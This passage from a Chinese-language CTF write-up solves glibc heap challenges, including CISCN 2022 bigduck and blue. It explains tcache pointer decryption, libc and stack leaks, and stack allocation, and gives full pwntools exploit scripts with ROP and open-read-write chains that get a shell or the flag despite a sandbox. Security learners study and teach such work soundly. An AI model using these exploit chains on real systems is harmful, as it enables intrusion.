   ![image-20240715211338249](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152113457.png)

2. 修改tcache的next指针，实现任意地址分配chunk，但是由于glibc-2.34版本较高，tcache的next指针会有一个加密过程：(当前next指针地址>>>12)^(要指向的下一个chunk地址) ， 第一个进入tcache的**chunk下一个chunk地址**为0。（注意进入tcache时链表采用的是**头插法**）

   进入gdb调试：

   ![image-20240715212203926](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152122338.png)

   第一个进入tcache的chunk，由于tcache中的地址为0，所以仅为其本身的next地址右移12位：

   ![image-20240715212937853](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152129122.png)

   ![image-20240715213214241](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152132433.png)

   ![image-20240715213621262](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152136652.png)

   ![image-20240715212429808](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152124071.png)

   ```python
   #获取"tcache基地址"，后续修改next指针伪造chunk时使用
   show(0)
   p.recvuntil(b"\x0a")
   tcache_base = u64(p.recv(5).ljust(8,b"\x00"))
   success("tcache_base==>"+hex(tcache_base))
   ```

3. 申请environ作为fake_chunk（这里申请的地址要以0x10对齐，最低位必须为0，是0x8就需要向上低地址调整），然后泄漏environ中存储的栈地址：

   ```python
   #申请environ堆,泄漏其中的栈地址
   fake_addr = environ_addr
   payload6 = fd_glibc32(tcache_base,fake_addr)
   edit(6,payload6)
   
   #泄漏其中的栈地址
   add()   #9
   add()   #10
   show(10)
   p.recv()
   stack_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("stack_addr==>"+hex(stack_addr))
   ```

   ![image-20240715214544130](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152145494.png)

4. 确定该泄漏的地址，与rbp寄存器的偏移，再申请该**空间为fake_chunk地址**，最后往该地址上写入数据（构造的ROP链）：

   ```python
   #任意分配栈上的chunk
   bp_addr = stack_addr-0x168      #不能直接到rbp的位置,要往前送0x10个字节
   success("bp_addr==>"+hex(bp_addr))
   free(9)
   fake_addr = bp_addr
   payload9 = fd_glibc32(tcache_base,fake_addr)
   edit(9,payload9)
   
   #申请到栈上的chunk,构造ROP链,并修改返回值
   add()   #11
   add()   #12
   payload12 = b"a"*8*3 + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)
   edit(12,payload12)
   ```

   ![image-20240715214719216](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407152147507.png)

   

```python
from pwn import *
# from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

def debug():
    print(proc.pidof(p))
    pause()

# p = remote("node4.anna.nssctf.cn",28836)
p = process("./pwn") 
libc = ELF('./libc.so.6')
elf = ELF("./pwn")


def add():
    p.sendlineafter(b':','1')
    # p.sendlineafter(b':',str(size))
    # p.sendlineafter(b':',content)

def edit(index,content):
    p.sendlineafter(b':',b'4')
    p.sendlineafter(b':',str(index).encode())
    p.sendlineafter(b':',str(len(content)).encode())
    p.sendafter(b':',content)

def show(index):
    p.sendlineafter(b':',b'3')
    p.sendlineafter(b':',str(index).encode())

def free(index):
    p.sendlineafter(b':','2')
    p.sendlineafter(b':',str(index).encode())

def fd_glibc32(tcache_base,target_addr):
    success("fake_addr==>"+hex(target_addr))
    payload = p64(tcache_base^(target_addr))
    return payload

# 溢出进unsortedbin
for i in range(9):
    add()
for i in range(7):
    free(i)
#泄漏libc基地址
free(7)
show(7)
p.recv()
addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
success("main_arena_unsortbin_addr==>"+hex(addr))
main_arena_offset = 0x1F2C60
success("main_arena_offset==>"+hex(main_arena_offset))
libc_base = addr-(main_arena_offset+0x60)
success("libc_addr==>"+hex(libc_base))
 
#计算__free_hook和system地址
system_addr = libc_base+libc.sym["system"]
sh_addr = libc_base + next(libc.search(b"/bin/sh"))
environ_addr = libc_base+libc.sym["environ"]
pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi;ret;')))
success("system_addr==>"+hex(system_addr))
success("environ_addr==>"+hex(environ_addr))
success("bin_sh_addr==>"+hex(sh_addr))
success("pop_rdi_ret==>"+hex(pop_rdi_ret))

#获取tcache基地址
show(0)
p.recvuntil(b"\x0a")
tcache_base = u64(p.recv(5).ljust(8,b"\x00"))
success("tcache_base==>"+hex(tcache_base))

#申请environ堆,泄漏其中的栈地址
fake_addr = environ_addr
payload6 = fd_glibc32(tcache_base,fake_addr)
edit(6,payload6)

#泄漏其中的栈地址
add()   #9
add()   #10
show(10)
p.recv()
stack_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
success("stack_addr==>"+hex(stack_addr))

#任意分配栈上的chunk
bp_addr = stack_addr-0x168      #不能直接到rbp的位置,要往前送0x10个字节
success("bp_addr==>"+hex(bp_addr))
free(9)
fake_addr = bp_addr
payload9 = fd_glibc32(tcache_base,fake_addr)
edit(9,payload9)

#申请到栈上的chunk,构造ROP链,并修改返回值
add()   #11
add()   #12
payload12 = b"a"*8*3 + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)
edit(12,payload12)
p.sendline(b"cat flag")
p.interactive()
```

 ![image-20240715190832783](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407151948450.png)

# 5. [CISCN 2022 华东北 ] bigduck

题目地址：[[CISCN 2022 华东北\]bigduck | NSSCTF](https://www.nssctf.cn/problem/2389)

### 思路：

1. 基本思路和上体一样，只不过这题开了sanbox，拿flag时需要绕过：****
2. 泄漏**堆的key**和**libc基地址** ==> 泄漏environ中的**栈地址** ==> 往栈上写ORW

### 分析：

1. 程序开了黑名单，禁用了execve，要构造ORW输出flag：

   ![image-20240724163547724](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241635860.png)

   

### 利用：

1. 泄漏**堆的key**和**libc基地址** 流程和上题一样，不过在泄漏main_arena地址时，**最低位是b"\x00"直接puts输出不了**，要先将其覆盖掉：

   ![image-20240724164141072](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241715943.png)

   ![image-20240724164053220](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241640402.png)

2. 接下来申请到environ去泄漏栈地址，用于该版本的tcache的next有加密，所以在覆盖next指针之前，用前面泄漏的tcache的key先计算出正确的next值，再覆盖：

   ![image-20240724164628280](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241646464.png)

3. 最后泄漏出栈地址，确定返回值的偏移为0x128（实际上0x128不行，后面会解释），申请到该地址为chunk，向里面写入ORW。

   **注意栈上的chunk地址要按0x10对齐** 。

   tcache要防止double free，会在next指针的下一位**放一个值** (tcache chunk的地址)，free时**判断该值是否相同** ，相同就会产生double free报错。在向tcache申请chunk后，会将**该位置的值清0**，再将chunk返回。

   **注意直接用0x128偏移会导致程序申请chunk后退出add函数返回时崩溃** ，因为申请到该栈上的chunk后会将**后面的返回值清空**（对应到tcache的next后面用来判断double free的值），会导致程序无法正常回到main函数：

   add退出，执行malloc之前，该处的返回值没变：

   ![image-20240724165836197](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241658537.png)

   申请之后：

   ![image-20240724165858890](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241658189.png)

   ![image-20240724170351928](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241703052.png)

   ![image-20240724170014952](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241700155.png)

   所以需要将分配的栈地址往上再减一个0x10，**偏移变为0x138**，返回值就不会收到影响，让add函数能正常返回，相应的后面填充时要多填充0x10个字符。

4. 完整EXP：

   ```python
   from pwn import *
   # from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node4.anna.nssctf.cn",28984)
   p = process("./pwn") 
   libc = ELF('./libc.so.6')
   elf = ELF("./pwn")
   
   
   def add():
       p.sendlineafter(b':','1')
       # p.sendlineafter(b':',str(size))
       # p.sendlineafter(b':',content)
   
   def edit(index,content):
       p.sendlineafter(b':',b'4')
       p.sendlineafter(b':',str(index).encode())
       p.sendlineafter(b':',str(len(content)).encode())
       p.sendafter(b':',content)
   
   def show(index):
       p.sendlineafter(b':',b'3')
       p.sendlineafter(b':',str(index).encode())
   
   def free(index):
       p.sendlineafter(b':','2')
       p.sendlineafter(b':',str(index).encode())
   
   def fd_glibc32(tcache_base,target_addr):
       success("fake_addr==>"+hex(target_addr))
       payload = p64(tcache_base^(target_addr))
       return payload
   
   #获取堆的基地址tcache
   add()   #0
   add()   #1
   add()   #2
   free(0)
   show(0)
   p.recvuntil(b"\x0a")
   tcache_base = u64(p.recv(5).ljust(8,b"\x00"))
   success("tcache_base==>"+hex(tcache_base))
   
   for i in range(6):
       edit(0,p64(0)*2)
       free(0)
   
   free(1)
   edit(1,b"\x01")
   show(1)
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))-1
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
    
   #计算__free_hook和system地址
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   environ_addr = libc_base + libc.sym["environ"]
   success("environ_addr==>"+hex(environ_addr))
   
   payload = fd_glibc32(tcache_base,environ_addr)
   edit(0,payload)
   add()   #3
   add()   #4
   show(4)
   p.recv()
   stack_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))-0x138
   success("stack_addr==>"+hex(stack_addr))
   
   #申请到栈上的chunk
   free(3)
   edit(3,p64(0)*2)
   free(3)
   payload = fd_glibc32(tcache_base,stack_addr)
   edit(3,payload)
   
   #布置ORW
   pop_rdi_ret=libc_base+0x0000000000028a55
   pop_rdx_ret=libc_base+0x00000000000c7f32
   pop_rax_ret=libc_base+0x0000000000044c70
   pop_rsi_ret=libc_base+0x000000000002a4cf
   ret=libc_base+0x0000000000026699
   
   open_addr = libc.sym['open']+libc_base
   read_addr = libc.sym['read']+libc_base
   write_addr = libc.sym['write']+libc_base    
   
   flag = stack_addr
   orw = b"./flag\x00\x00" + b"a"*0x10
   # open(0,flag)
   orw+=p64(pop_rdi_ret)+p64(flag)
   orw+=p64(pop_rsi_ret)+p64(0)
   orw+=p64(open_addr)
   
   # read(3,heap+0x1010,0x30) 
   orw+=p64(pop_rdi_ret)+p64(3)
   orw+=p64(pop_rsi_ret)+p64(stack_addr+0x100)
   orw+=p64(pop_rdx_ret)+p64(0x30)
   orw+=p64(read_addr)     
   
   # write(1,heap+0x1010,0x30)
   orw+=p64(pop_rdi_ret)+p64(1)
   orw+=p64(pop_rsi_ret)+p64(stack_addr+0x100)#存放地址0x50
   orw+=p64(pop_rdx_ret)+p64(0x30)
   orw+=p64(write_addr)
   
   add()   #5
   add()   #6
   #覆盖掉返回值
   edit(6,orw)
   
   p.interactive()
   ```

# 6. [[CISCN 2022 华东北\]blue | NSSCTF](https://www.nssctf.cn/problem/2390)

### 思路：

1. 利用**一次性的UAF和show泄漏libc地址**，计算出**environ地址**，**_IO_2_1_stdout_地址**。
2. 利用unsortedbin和tcache，结合使用造成**overlaping**修改next指针，实现**任意地址分配chunk**。
3. 修改**_IO_2_1_stdout_结构**，泄漏**environ中的栈地址**。
4. 利用造成的**overlaping**修改next指针，分配chunk到栈上，覆盖函数的返回值，写入ORW获取flag。

### 分析：

1. 主要看show函数和提供的一次性UAF函数，show函数只能够使用一次，即只能泄漏一次地址：

   ![image-20240722151423924](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221514041.png)

2. 提供的后门函数中，有一次性UAF，只能使用一次：

   ![image-20240722151547969](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221515065.png)

### 利用：

1. 先利用一次性UAF和show函数泄漏libc地址：

   ```python
   # 溢出进unsortedbin
   for i in range(9):
       add(0x80,b'a')
   for i in range(7):
       free(i)
   add(0x38,b'a')  #0
   
   backdoor(8)
   show(8)
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = 0x1EbB80
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-(main_arena_offset+0x60)
   success("libc_addr==>"+hex(libc_base))
    
   #计算environ地址
   system_addr = libc_base+libc.sym["system"]
   sh_addr = libc_base + next(libc.search(b"/bin/sh"))
   environ_addr = libc_base+libc.sym["environ"]
   pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi;ret;')))
   success("system_addr==>"+hex(system_addr))
   success("environ_addr==>"+hex(environ_addr))
   success("bin_sh_addr==>"+hex(sh_addr))
   success("pop_rdi_ret==>"+hex(pop_rdi_ret))
   ```

2. 然后，利用之前UAF进入unsortedbin的chunk，再次将其释放进入tcache（先在tcache中清理出来一个空间），此时**tcache被放满**，且UAF的块已经形成double free，继续申请到unsortedbin中的chunk，直到覆盖掉tcache中的next指针位置，现在可以控制next指针，实现任意地址分配：

   ```python
   # 实现overlaping，将一个堆块一次放入tcache，一次放入unsortedbin
   # 在通过overlaping申请unsortedbin中的chunk，覆盖到tcache中的next指针
   free(7)         #与目标堆块合并,后续申请更大的堆块时覆盖到目标堆块的next指针
   add(0x80,b"a")  #1 tcache腾出一个位置.后续放目标堆块
   free(8)         #目标堆块进入unsortedbin,目标堆块要选择高地址的chunk
   
   
   add(0x68,b"a")  	#2 在unsortedbin中申请chunk,实现overlaping
   payload = p64(0)*(3)+p64(0x91)+p64(IO_2_1_stdout_addr)
   add(0x68,payload)   #3 一次申请unsortedbin覆盖不到next指针,所以分两次申请
   add(0x80,b"a")  	#4 目标bin
   #修改IO_2_1_stdout_addr结构体
   payload = p64(0xfbad1800)+p64(0)*3+p64(environ_addr)+p64(environ_addr+8)*2
   add(0x80,payload)  	#5 任意地址分配到chunk IO_2_1_stdout_addr，并修改
   heap_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("heap_addr==>"+hex(heap_addr))	#泄漏栈地址
   
   ```
   
   先在目标bin前面（低地址）合并一个bin，便于最后在unsortedbin中申请**大于0x80的chunk**（这样才不会去tcache中拿）：
   
   ![image-20240722152720725](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221527949.png)
   
   将tcache中腾出一个空间后，将目标bin放入tcache：
   
   ![image-20240722152924102](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221529306.png)
   
   在unsortedbin中申请一个chunk，大小覆盖到next指针即可：
   
   ![image-20240722153526842](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407232235173.png)
   
   ![image-20240722160201558](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221602782.png)
   
   
   
   ![image-20240722161122210](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221611413.png)
   
   接着修改完IO_2_1_stdout_结构后，泄漏出**栈地址**：
   
   ![image-20240722163641183](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221636281.png)
   
   确定返回值与该栈地址的偏移，申请到返回值处的chunk：
   
   ![image-20240722164102393](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221641540.png)
   
   
   
   后续申请完两次后，也可以一直像这样使用实现任意地址分配chunk，只需要再次释放掉**目标bin**即可，size未0xa1的chunk一直会覆盖目标bin的next指针，也就是只要free一次目标bin后double free一直存在。所以下面申请到栈地址处的chunk：
   
   ```python
   #第二次使用overlaping 
   free(4)
   free(3)
   payload = p64(0)*(3)+p64(0x91)+p64(heap_addr-0x128)
   add(0x68,payload)   #3 一次申请unsortedbin覆盖不到next指针,所以分两次申请
   debug()
   ```
   
   ![image-20240722164455186](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221714676.png)
   
3. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   p = remote("node4.anna.nssctf.cn",28344)
   # p = process("./pwn")
   # p = gdb.debug("./pwn")
   libc = ELF('./libc.so.6')
   elf = ELF("./pwn")
   
   def add(size,content):
       p.sendlineafter(b':',b'1')
       p.sendlineafter('Please input size: ', str(size))
       p.sendafter('Please input content: ', content)
   
   def show(index):
       p.sendlineafter(b':',b'3')
       p.sendlineafter(b':',str(index).encode())
   
   def free(index):
       p.sendlineafter(b':',b'2')
       p.sendlineafter('Please input idx: ', str(index))
   
   def backdoor(index):
       p.sendlineafter(b":",b"666")
       p.sendlineafter(b':',str(index).encode())
   
   
   # 溢出进unsortedbin
   for i in range(9):
       add(0x80,b'a')
   for i in range(7):
       free(i)
   add(0x38,b'a')  #0
   
   backdoor(8)
   show(8)
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = 0x1EcB80
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = addr-0x1ecbe0
   success("libc_addr==>"+hex(libc_base))
    
   #计算__free_hook和system地址
   IO_2_1_stdout_addr = libc_base + libc.sym["_IO_2_1_stdout_"]
   environ_addr = libc_base + libc.sym["environ"]
   success("IO_2_1_stdout_addr==>"+hex(IO_2_1_stdout_addr))
   success("environ_addr==>"+hex(environ_addr))
   
   # 实现overlaping，将一个堆块一次放入tcache，一次放入unsortedbin
   # 在通过overlaping申请unsortedbin中的chunk，覆盖到tcache中的next指针
   free(7)         #与目标堆块合并,后续申请更大的堆块时覆盖到目标堆块的next指针
   
   add(0x80,b"a")  #1 tcache腾出一个位置.后续放目标堆块
   free(8)         #目标堆块进入unsortedbin,目标堆块要选择高地址的chunk
   
   add(0x68,b"a")  #2 在unsortedbin中申请chunk,实现overlaping
   payload = p64(0)*(3)+p64(0x91)+p64(IO_2_1_stdout_addr)
   add(0x68,payload)   #3 一次申请unsortedbin覆盖不到next指针,所以分两次申请
   add(0x80,b"a")  #4 目标bin
   #修改IO_2_1_stdout_addr结构体
   payload = p64(0xfbad1800) + p64(0)*3 + p64(environ_addr) + p64(environ_addr+8)*2
   add(0x80,payload)  #5 任意地址分配的chunk IO_2_1_stdout_addr
   stack_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))-0x128
   success("stack_addr==>"+hex(stack_addr))
   
   #第二次使用overlaping 
   free(4)
   free(3)
   
   payload = p64(0)*(3)+p64(0x91)+p64(stack_addr)
   add(0x68,payload)   #3 一次申请unsortedbin覆盖不到next指针,所以分两次申请
   add(0x80,b'a')
   
   # 构造ORW
   read_addr = libc_base + libc.sym['read']
   open_addr = libc_base + libc.sym['open']
   write_addr = libc_base + libc.sym['write']
   puts_addr = libc_base + libc.sym['puts']
   #pop_rdi_ret = libc_base + libc.search(asm('pop rdi;ret;')).__next__()
   pop_rdi_ret = libc_base + 0x0000000000023b6a
   #pop_rsi_ret = libc_base + libc.search(asm('pop rsi;ret;')).__next__()
   pop_rsi_ret = libc_base + 0x000000000002601f
   #pop_rdx_ret = libc_base + libc.search(asm('pop rdx;ret;')).__next__()
   pop_rdx_ret = libc_base + 0x0000000000142c92
   
   flag_addr = stack_addr
   put = stack_addr + 0x200
   
   payload = b'./flag\x00\x00'
   # open('./flag', 0)
   # payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
   payload += flat(pop_rdi_ret,flag_addr,pop_rsi_ret,0,open_addr)
   # read(3, put, 0x50)
   # payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(put) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)
   payload += flat(pop_rdi_ret,3,pop_rsi_ret,put,pop_rdx_ret,0x50,read_addr)
   # puts(put)
   
   # payload += p64(pop_rdi_ret) + p64(put) + p64(puts_addr)
   payload += flat(pop_rdi_ret,put,puts_addr)
   add(0x80, payload)
   
   p.interactive()
   ```
   
   成功拿到flag：
   
   ![image-20240722181926393](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407221819534.png)
